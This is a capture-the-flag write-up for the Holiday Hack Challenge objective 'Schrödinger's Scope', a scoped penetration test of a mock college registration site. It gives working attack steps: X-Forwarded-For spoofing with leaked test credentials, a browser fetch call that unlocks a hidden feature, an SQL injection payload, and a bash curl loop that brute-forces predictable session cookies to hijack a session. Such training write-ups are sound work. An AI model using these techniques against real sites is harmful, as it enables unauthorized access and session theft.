---
layout: default
title: act3_schrodingersscope_mjd
nav: |
  |[Previous Objective: Act3 Snowcat RCE abd Privilege Escalation](/act3_snowcat_mjd.md)  |   [Table of Contents](/index.md) | [Next Objective: Act3 Find and Shutdown Frosty's Snowglobe Machine](/act3_snowglobe_mjd.md) |
  | :----------------------- | :--------------------------------: | --------------------------------: |
---
<table>
<thead>
<tr>
<th>Objective: Schrödinger's Scope</th>
<br>
<th>Difficulty Level: 3</th>
</tr>
</thead>
<tbody>
<tr>
<td>Kevin in the Retro Store ponders pentest paradoxes-can you solve Schrödinger's Scope?</td>
<br>
<td>Location: Retro Store</td>
</tr>
</tbody>
</table>

<h2>Solution Overview</h2>

The objective is to conduct a penetration test of a Neighborhood College Registration system. The test is scoped to a specific path of the application, accessing other paths is limited by an active monitoring system. When a threshold is reached, the engagement is reset. This resets the cookies that track the session and achievements. When this occurs, any vulnerabilities achieved are no longer logged and must be redone. The testing begins with reconnaisance of the application. Vulnerabilities are tested and exploited if possible.

<table>
<thead>
<tr>
<th>Activity</th>
<br>
<th>Primary Tactic</th>
<br>
<th>MITRE ATT&CK Technique ID</th>
<br>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Developer information disclosure</td>
<br>
<td>Reconnaissance</td>
<br>
<td>T1592.004</td>
<br>
<td>Gather Credentials</td>
</tr>
<tr>
<td>X-Forwarded-For exploit</td>
<br>
<td>Initial Access</td>
<br>
<td>T1190</td>
<br>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Found commented code</td>
<br>
<td>Reconnaissance</td>
<br>
<td>T1595.002</td>
<br>
<td>Vulnerability Scanning</td>
</tr>
<tr>
<td>SQL Injection</td>
<br>
<td>Initial Access</td>
<br>
<td>T1190</td>
<br>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Unauthorized content</td>
<br>
<td>Discovery</td>
<br>
<td>T1083</td>
<br>
<td>File and Directory Discovery</td>
</tr>
<tr>
<td>Cookie prediction</td>
<br>
<td>Credential Access</td>
<br>
<td>T1539</td>
<br>
<td>Steal Web Session Cookie</td>
</tr>
</tbody>
</table>

<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>

The initial step was to identify the bot responsible for the additional scope violations

<img src="/images/shroedingers_webbot.jpg" alt="Identification of WebBot">

With the object pattern identified, it is possible to use browser Developer Tools to block the request.
<br>
Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "<em>gnomeU</em>"

<img src="/images/shroedingers_webbotblock.jpg" alt="Blocking of WebBot">

Reconnaisance began with examining the contents of the sitemap for the application.
<br>
The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934

<pre><code class="language-">
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/
<br>
>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
<br>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
<br>
</code></pre>
<br>
Exploring the endpoints revealed several pages of notes, two that were within the scope.
<br>
The first enpoint found: /register/dev/dev_todos

<img src="/images/shroedingers_devtodos.jpg" alt="Developer Information To Do List">

The second endpoint found: /register/dev/dev_notes

<img src="/images/shroedingers_devnotes.jpg" alt="Developer Information Notes">

Locating both of these files construct the Developer information disclosure vulnerability discovered.

<strong>Answer: Developer information disclosure</strong>

With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself.

<img src="/images/shroedingers_xforwarder.jpg" alt="Spoofing the X-Forwarder Header">

The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.

Spoofing the X-Forwarded-For header and authenticating as testuser achieves the second vulnerability.

<strong>Answer: X-Forwarded-For exploit</strong>

Examining the source code for the courses page, a commented secion of code is discovered.

<img src="/images/shroedingers_commentedsearch.jpg" alt="Commented Search Feature">

Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:

<pre><code class="language-js">
<br>
function checkAndReportCourseSearch() {
<br>
  const courseList = document.getElementById('courseSearch');
<br>
  if (courseList && !courseList.dataset.trapTriggered) {
<br>
    courseList.dataset.trapTriggered = "true";
<br>
    fetch('/register/courseSearchUnlocked', {
<br>
      method: 'POST',
<br>
      headers: { 'Content-Type': 'application/json' },
<br>
      body: JSON.stringify({
<br>
        message: 'Course search was uncommented!',
<br>
        timestamp: Date.now(),
<br>
        linkCount: courseList.querySelectorAll('a').length
<br>
      })
<br>
    })
<br>
</code></pre>
<br>
Executing the following code in the Developer Console activates the code:

<pre><code class="language-js">
<br>
fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: 'Course search was uncommented!', timestamp: Date.now(), linkCount: 1 }) }).then(r => r.text()).then(console.log)
<br>
</code></pre>

This activates the search feature in the application:

<img src="/images/shroedingers_activatedsearch.jpg" alt="Activated Search Feature">

<strong>Answer: Found commented code</strong>

Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.

<img src="/images/shroedingers_searchsqli.jpg" alt="Search SQL Injection">

<strong>Answer: SQL Injection</strong>

This reveals the unauthorized course and allows me to report it:
<img src="/images/shroedingers_mischief.jpg" alt="Unauthorized Course">

Opening the course details prompts for reporting:
<img src="/images/shroedingers_gnomecourse.jpg" alt="Unauthorized Course Details">

<strong>Answer: Unauthorized content</strong>

The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.

<img src="/images/shroedingers_wipermissions.jpg" alt="Registration Value">

Looking at the registration values generated:

<pre><code class="language-">
<br>
registration	eb72a05369dcb44d
<br>
registration	eb72a05369dcb44d
<br>
registration	eb72a05369dcb455
<br>
registration	eb72a05369dcb453
<br>
registration	eb72a05369dcb451
<br>
registration	eb72a05369dcb454
<br>
registration	eb72a05369dcb444
<br>
registration	eb72a05369dcb445
<br>
registration	eb72a05369dcb447
<br>
registration	eb72a05369dcb449
<br>
registration	eb72a05369dcb456
<br>
registration	eb72a05369dcb448
<br>
registration	eb72a05369dcb452
<br>
registration	eb72a05369dcb44a
<br>
registration	eb72a05369dcb443
<br>
</code></pre>

Only the last two digits change, this indicates there are only 256 variations.
<br>
The TestUser needs to be logged in to test the registration values.
<br>
Using this script to locate the valid session:

<pre><code class="language-sh">
<br>
#!/bin/bash
<br>
prefix="eb72a05369dcb4"
<br>
schrod="7c3ee3a7-6781-459b-8db9-eee63c05558b"
<br>
id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"

for i in {0..255}; do
<br>
  hex=$(printf '%02x' $i)

<h1>Login and access page in one flow</h1>
<br>
  response=$(curl -s -L \
<br>
    -H "X-Forwarded-For: 127.0.0.1" \
<br>
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
<br>
    -d "username=teststudent&password=2025h0L1d4y5" \
<br>
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id" \
<br>
    --next \
<br>
    -H "X-Forwarded-For: 127.0.0.1" \
<br>
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
<br>
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")

  if ! echo "$response" | grep -qi "invalid"; then
<br>
    echo "============================================"
<br>
    echo "VALID REGISTRATION COOKIE FOUND!"
<br>
    echo "registration=${prefix}${hex}"
<br>
    echo "============================================"
<br>
    echo ""
<br>
    echo "$response"
<br>
    echo ""
<br>
    echo "============================================"
<br>
    echo "Response saved to: /tmp/valid_${hex}.html"
<br>
    echo "$response" > /tmp/valid_${hex}.html
<br>
    exit 0
<br>
  else
<br>
    echo -n "."
<br>
  fi
<br>
done

echo ""
<br>
echo "No valid registration cookie found in range 00-ff"
<br>
</code></pre>

This results in a VALID REGISTRATION COOKIE FOUND!
<br>
registration=eb72a05369dcb44c

Hijacking this session token, the document in wip is accessed.

<strong>Answer: Cookie prediction</strong>

<img src="/images/shroedingers_final.jpg" alt="Final Assessment Results">

</details>

<h2>Tools Reference</h2>

<table>
<thead>
<tr>
<th>Tools Used</th>
<br>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Edge Developer Tools</td>
<br>
<td>Version 142.0.3595.53</td>
</tr>
<tr>
<td>Burp Suite Community Edition</td>
<br>
<td>v2024.11.2</td>
</tr>
</tbody>
</table>


<h2>Hints Reference</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<br>
<td>Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>Watch out for tiny, pesky gnomes who may be violating your progess. If you find one, figure out how they are getting into things and consider matching and replacing them out of your way.</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a sitemap can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>Pay close attention to the instructions and be very wary of advice from the tongues of gnomes! Perhaps not ignore everything, but be careful!</td>
</tr>
<tr>
<td>Kevin</td>
<br>
<td>The Neighborhood College Course Registration System has been getting some updates lately and I'm wondering if you might help me improve its security by performing a small web application penetration test of the site. For any web application test, one of the most important things for the test is the 'scope', that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope. Thankfully, the Neighborhood College has provided a very concise set of 'Instructions' which are accessible via a link provided on the site you will be testing. Do not overlook or dismiss the instructions! Following them is key to successfully completing the test. Unfortunately, those pesky gnomes have found their way into the site and have been causing some mischief as well. Be wary of their presence and anything they may have to say as you are testing. Can you help me demonstrate to the Neighborhood College that we know what responsible penetration testing looks like?</td>
</tr>
</tbody>
</table>

<h2>Acknowledgements</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>khesperus</td>
<br>
<td>Provided a sanity check by confirming that I had all the elements to solve the objective</td>
</tr>
<tr>
<td>eucrates</td>
<br>
<td>Provided feedback on scope and avoiding rabbit holes</td>
</tr>
</tbody>
</table>